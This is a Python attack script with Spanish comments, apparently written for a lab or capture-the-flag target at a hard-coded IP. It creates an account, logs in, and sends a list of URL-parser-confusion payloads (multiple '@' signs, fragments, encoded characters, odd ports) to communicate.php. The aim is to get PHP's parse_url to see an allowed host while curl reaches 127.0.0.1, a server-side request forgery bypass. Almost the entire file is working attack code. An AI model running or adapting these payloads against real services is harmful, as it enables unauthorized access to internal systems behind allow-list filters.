#!/usr/bin/env python3
"""
CVE-2016-10397: parse_url() can be bypassed with specific URL formats in PHP < 7.0.17

En versiones antiguas de PHP 7.0, parse_url() puede ser engañado con:
- URLs que contienen espacios o tabs en lugares específicos
- URLs con múltiples @ symbols
- URLs con componentes malformados

PHP 7.0.33 fue lanzado en Sep 2017, después del fix, pero puede haber otros bugs.

Otro bug conocido: parse_url() maneja diferente las URLs que curl
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# URLs que explotan diferencias entre parse_url y curl
# El objetivo es que parse_url vea "motherland.com" pero curl vea "127.0.0.1"

test_urls = [
    # parse_url ve el primer @, curl puede ver el segundo
    "http://motherland.com:80@127.0.0.1:80/",
    
    # Con puerto no numérico (parse_url puede fallar)
    "http://motherland.com:abc/",
    "http://motherland.com:80x/",
    
    # Con path que parece host
    "http://motherland.com/../../127.0.0.1/",
    "http://motherland.com/..",
    
    # Con query string que parece host
    "http://motherland.com?@127.0.0.1",
    "http://motherland.com?host=127.0.0.1",
    
    # Con fragmento engañoso
    "http://motherland.com#@127.0.0.1/",
    
    # URLs con espacios (pueden ser interpretados diferente)
    "http://motherland.com /",
    "http://motherland.com\t/",
    
    # Con user:pass que confunde
    "http://foo:bar@motherland.com/",
    "http://:@motherland.com/",
    
    # Con port 0 (especial en algunas implementaciones)
    "http://motherland.com:0/",
    "http://motherland.com:-1/",
    
    # Con múltiples dots
    "http://motherland.com.../",
    "http://...motherland.com/",
    
    # Con encoding especial
    "http://mother%6cand.com/",  # %6c = l
    "http://motherlan%64.com/",  # %64 = d
]

for url in test_urls:
    print(f"[*] Probando: {repr(url)}")
    data_req = {
        'url': url,
        'data[action]': 'edit',
        'data[new_name]': 'PAYLOAD'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data_req, timeout=10)
        
        if "Wrong URL" in resp.text:
            print(f"    [-] Wrong URL (regex falló)")
        elif "Failed when parsing" in resp.text:
            print(f"    [-] Failed parsing (filter_var falló)")
        elif "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                if "timed out" not in error.lower():
                    print(f"    [!] Error diferente: {error}")
                else:
                    print(f"    [-] Timeout (esperado)")
        elif "Done!" in resp.text:
            print(f"    [+++] ¡SUCCESS! Done!")
        elif len(resp.text) > 4000:
            print(f"    [?] Respuesta grande: {len(resp.text)} bytes")
        else:
            print(f"    [?] Respuesta: {len(resp.text)} bytes")
            
    except Exception as e:
        print(f"    [!] Exception: {str(e)[:60]}")
    
    print()
